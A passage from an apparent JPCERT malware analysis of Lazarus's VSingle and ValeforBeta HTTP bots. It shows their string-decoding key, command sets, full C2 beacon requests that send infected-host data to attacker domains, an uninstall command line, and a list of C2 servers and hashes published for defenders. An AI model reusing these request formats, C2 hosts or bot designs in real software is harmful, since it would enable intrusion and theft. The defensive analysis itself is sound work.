It also\ndownloads and executes plugins.\n\nOnce launched, this malware runs Explorer and executes its main code through DLL\ninjection. (Some samples do not perform DLL injection.) The main code contains the\nfollowing PDB path:\n```\nG:\\Valefor\\Valefor_Single\\Release\\VSingle.pdb\n\n```\nThe next sections describe VSingle's obfuscation technique and communication format.\n\n### VSingle obfuscation technique\n\nMost of the strings in VSingle are obfuscated. Figure 1 shows the code to disable\nobfuscation. A fixed key value (o2pq0qy4ymcrbe4s) decodes the strings by XOR.\n\n\n-----\n\nFigure 1: Code to\n\ndisable obfuscation in VSingle\nBelow is some parts of decoded strings:\n```\n[+] Download Parameter Error\n[+] Download Result \n[+] Upload Result \n[+] Upload Parameter Error\n[+] Interval\n  Interval was set to \n[+] Plugin Download Result \n[+] Update\n[+] Info\n[+] Uninstall\n  Valefor was uninstalled successfully.\n[+] Executable Download Result \n[+] Executable Download Parameter Error\nufw=%s&uis=%u\ncmd.exe /c %s\n[%02d-%02d-%04d %02d:%02d:%02d]\n[+] Plugin Execute Result\n\n### VSingle communication with C2 servers\n\n```\nBelow is the HTTP GET request that VSingle sends to its C2 server at the beginning of the\ncommunication.\n\n\n-----\n\n```\nGET /polo/[Unix time]/[random string].php?ufw [Base64 data]&uis [unique ID] HTTP/1.1\nHost: maturicafe.com\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5)\nGecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\nAccept: text/html3,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 300\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\n```\n[Base64 data] contains the Base64-encoded value of \"[IP address]|[Windows version\nnumber]|[version]\". As a response to this request, AES-encrypted data including commands\nis downloaded from the server. The encryption key is specified in Set-Cookie header in the\nresponse.\nVSingle also works with authentication proxy (Basic authentication). If the malware contains\nproxy settings, it can communicate in proxy environment as follows:\n```\nGET https://maturicafe.com/polo/[Unix time]/[random string].php?ufw=[Base64\ndata]&uis=[unique ID] HTTP/1.1\nHost: maturicafe.com\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5)\nGecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\nProxy-Connection: keep-alive\nProxy-Authorization: Basic [credential]\nPragma: no-cache\nCache-Control: no-cache\n\n### VSingle functions\n\n```\nVSingle has 8 simple functions as listed below:\n\nTable 1: VSingle commands\n\nCommand number Contents\n\n1 Upload file\n\n2 Set communication interval\n\n3 Execute arbitrary command\n\n4 Download/execute plugin\n\n5 Update\n\n6 Send malware information\n\n7 Uninstall\n\n\n-----\n\n8 Download file\n\nIt executes the following 4 types of plugins:\n\nWindows PE file (saved as a .tmp file)\nVBS file (saved as a .vbs file)\nBAT file (saved as a .bat file)\nShellcode\n\nFigure 2 shows a part of the code to execute a plugin.\n\nFigure 2: Part of\n\nVSingle code to execute a plugin\nPlugins are temporarily saved in %TEMP% folder and then executed except for the\nshellcode ones; They are saved in %TEMP% folder but loaded and executed on memory.\n\nWhen the command number 6 (sending malware information) is selected, the data in Figure\n3 is sent. As for the version number, 4.1.1, 3.0.1 and others have been confirmed in addition\nto 1.0.1. It is possible that this number indicates some sort of identifier, rather than its\nmalware version.\n\n\n-----\n\nFigure 3: Sample information send with\n\ncommand number 6\n\n### ValeforBeta overview\n\nValeforBeta is a HTTP bot developed in Delphi, and its functions are even simpler than those\nof VSingle. Besides arbitrary code execution from remote network, it just uploads and\ndownloads files.\n\nThe next sections describe ValeforBeta's configuration and communication format.\n\n### ValeforBeta configuration\n\nFigure 4 shows the code to load the configuration. It contains sample ID (\"512\" in Figure 4),\naccess type and intervals, as well as C2 server information.\n\n\n-----\n\nFigure 4: ValeforBeta\n\nconfiguration\nThere are 3 different access types:\n\nConnect directly (INTERNET_OPEN_TYPE_DIRECT)\nUse default setting (INTERNET_OPEN_TYPE_PRECONFIG)\nConnect via proxy (INTERNET_OPEN_TYPE_PROXY)\n\n### ValeforBeta communication with C2 servers\n\nBelow is the HTTP POST request that ValeforBeta sends to its C2 server at the beginning of\nthe communication.\n\n\n-----\n\n```\nPOST /doc/total.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=[Base64 data]\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0;\nSLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC\n6.0; InfoPath.3)\nHost: 3.90.97.16\nContent-Length: 0\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n```\nAlthough it is a HTTP POST request, it does not contain any data to send. The Base64encoded data after \"JSESSIONID=\" in the Cookie header contains the information of an\ninfected host. Below is the format of Base64-encoded data.\n```\n[8-letter random string][data][random string (4-12 letters)]\n\n```\n[data] contains the version information of the malware and the IP address of the infected\nhosts. (See request type \"0\" in Appendix A for more details.) If the response from the server\nis \"200 OK\", the next request is sent (Request type \"1\").\nThe C2 server sends data including commands. The result of the command execution is sent\nas a part of the HTTP POST request, disguised as a BMP file. Figure 5 shows part of the\ncode to send the command execution result.\n\nFigure 5:\n\nValeforBeta's code to send command execution result\n\n\n-----\n\n### ValeforBeta functions\n\nValeforBeta has only 6 functions as listed in Table 2.\n\nTable 2: ValeforBeta commands\n\n\nCommand\nnumber\n\n\nContents\n\n\n1 Download file\n\n2 Upload file\n\n3 Execute arbitrary shell command\n\n4 Uninstall (Executes cmd /c ping -n 4 127.0.0.1 >NUL & echo VFB > \"file\nname of itself\")\n\n6 Set Sleep Time\n\n7 Send system information\n\nThe command execution result is XOR-encoded. Figure 6 shows the decoded string of data\nsent with command number 7 (sending system information).\n\n\n-----\n\nFigure 6: Sample data\n\nsent by ValeforBeta\n\n### Tools used after intrusion\n\nThe attackers use the following 3 tools in this operation in order to relay communication with\nC2 server.\n\n3Proxy\nStunnel\nPlink\n\n### In closing\n\n\n-----\n\nWe introduced malware and tools that Lazarus used in the operation against Japanese\norganisations. We will provide an update if we find new types of malware.\nThe C2 servers connected to the samples described in this article are listed in Appendix B.\nPlease make sure that none of your devices is communicating with them.\n\nShusei Tomonaga\n(Translated by Yukako Uchida)\n\n**Appendix A: Data sent by ValeforBeta**\n\nTable A: Format of data sent\n\nOffset Length Contents\n\n0x00 1 Request type(0: Send client data, 1: Request a command, 2: Send\ncommand execution result)\n\n0x01 4 Client ID (generated from hostname, username, OS install date/time and\nMAC address)\n\n0x05 3 Malware version\n\n0x08 4 IP address\n\n0x0C 3 OS version\n\nData after 0x05 is XOR-encoded and added only for the request type \"0\".\n\n**Appendix B: C2 servers**\n\nhttp://aquagoat.com/customer\nhttp://blacktiger.com/input\nhttp://bluedog.com/submit\nhttp://coraltiger.com/search\nhttp://goldtiger.com/find\nhttp://greentiger.com/submit\nhttp://industryarticleboard.com/evolution\nhttp://industryarticleboard.com/view\nhttp://maturicafe.com/main\nhttp://purplefrog.com/remove\nhttp://whitedragon.com/search\nhttps://coralcameleon.com/register\nhttps://industryarticleboard.com/article\nhttps://maturicafe.com/polo\nhttps://salmonrabbit.com/login\nhttps://whitecameleon.com/find\n\n\n-----\n\nhttps://whiterabbit.com/input\nhttp://toysbagonline.com/reviews\nhttp://purewatertokyo.com/list\nhttp://pinkgoat.com/input\nhttp://yellowlion.com/remove\nhttp://salmonrabbit.com/find\nhttp://bluecow.com/input\nhttp://www.karin-store.com/data/config/total_manager.php\nhttp://katawaku.jp/bbs/data/group/group-manager.php\nhttp://3.90.97.16/doc/total.php\n\n**Appendix C: Malware hash value**\n\n487c1bdb65634a794fa5e359c383c94945ce9f0806fcad46440e919ba0e6166e\neb846bb491bea698b99eab80d58fd1f2530b0c1ee5588f7ea02ce0ce209ddb60\n\n[Email](http://10.10.0.46/mailto:?subject=Lazarus%20Attack%20Activities%20Targeting%20Japan%20%28VSingle%2FValeforBeta%29&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2021%2F03%2FLazarus_malware3.html)\n\nAuthor\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nSince December 2012, he has been engaged in malware analysis and forensics\ninvestigation, and is especially involved in analyzing incidents of targeted attacks.
